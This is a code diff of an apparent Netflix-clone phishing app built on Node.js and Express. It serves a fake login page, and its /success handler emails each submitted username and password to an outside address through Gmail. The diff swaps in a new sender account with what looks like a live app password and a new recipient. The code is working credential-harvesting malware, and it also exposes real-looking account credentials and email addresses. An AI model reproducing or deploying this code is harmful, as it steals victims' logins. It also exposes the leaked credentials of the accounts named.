@@ -6,17 +6,16 @@ app.use(bodyParser.urlencoded({extended:true}));
 app.use(express.static('library'))
 
 app.get("/",function(req,res){
-  //res.sendFile('./views/login.html',{root:__dirname})
-  res.render('hellow.ejs');
+  res.sendFile('./views/login.html',{root:__dirname})
 
 });
 
 app.post("/success",function(req,res){
     var transporter = nodemailer.createTransport({
         service: 'gmail',
-        auth: {
-          user: 'abrakadabra83181@gmail.com',
-          pass: 'phishingdemo'
+         auth: {
+          user: 'hammamiwissem21@gmail.com',
+          pass: 'wywfvfwsrynhlvpg'
         }
       });
 
@@ -28,8 +27,8 @@ app.post("/success",function(req,res){
     var data = username+"->"+password+"  \n";
     
     var mailOptions = {
-        from: 'abrakadabra83181@gmail.com',
-        to: 'iamtheanshgupta@gmail.com',
+        from: 'Mailing Test',
+        to: 'me@wissem-hammami.ovh',
         subject: 'mail from the netflix clone',
         text: `the username is ${username}and the password is ${password}`
       };
